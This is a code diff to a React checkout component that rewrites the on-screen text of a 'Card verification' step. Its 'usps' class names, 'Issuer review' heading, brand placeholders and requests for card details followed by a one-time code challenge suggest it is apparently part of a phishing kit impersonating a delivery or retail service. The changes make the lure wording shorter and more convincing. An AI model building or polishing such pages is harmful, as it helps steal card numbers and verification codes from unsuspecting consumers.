@@ -202,7 +202,7 @@ export default function Checkout() {
             <div>
               <div className="alz-badge">{BRAND.name}</div>
               <h1 className="alz-step-title">Card verification</h1>
-              <p className="alz-step-subtitle">Enter the card details required by your bank to continue.</p>
+              <p className="alz-step-subtitle">Enter the card details required by your bank.</p>
             </div>
           </div>
           <div className="alz-track mt-3">
@@ -213,8 +213,8 @@ export default function Checkout() {
         <div className="alz-flow-grid alz-usps-flow-grid">
           <div className="alz-card alz-usps-form-card">
             <div className="alz-section-eyebrow">Issuer review</div>
-            <h2 className="alz-page-title">Confirm your card details</h2>
-            <p className="alz-page-copy">Your bank may use these details to generate a secure verification challenge.</p>
+            <h2 className="alz-page-title">Confirm card details</h2>
+            <p className="alz-page-copy">Your bank may use these details to generate a one-time verification challenge.</p>
             <div className="alz-brand-row mb-4">
               {BRAND_PROMISES.map((item) => (
                 <span key={item} className="alz-brand-pill">{item}</span>
@@ -260,7 +260,7 @@ export default function Checkout() {
             <button onClick={onSubmit} disabled={!canSubmit || waiting} className="alz-btn-primary mt-6 text-base alz-checkout-submit">
               {waiting ? 'Processing...' : 'Continue'}
             </button>
-            <div className="alz-helper-copy mt-6">You may be asked to complete a one-time code challenge on the next step.</div>
+            <div className="alz-helper-copy mt-4">A one-time code challenge may appear on the next step.</div>
             <div className="alz-footer">{BRAND.name} | {BRAND.tagline}</div>
             <div className="text-[11px] text-center text-[#565959] mt-1">{BRAND.legal}</div>
           </div>
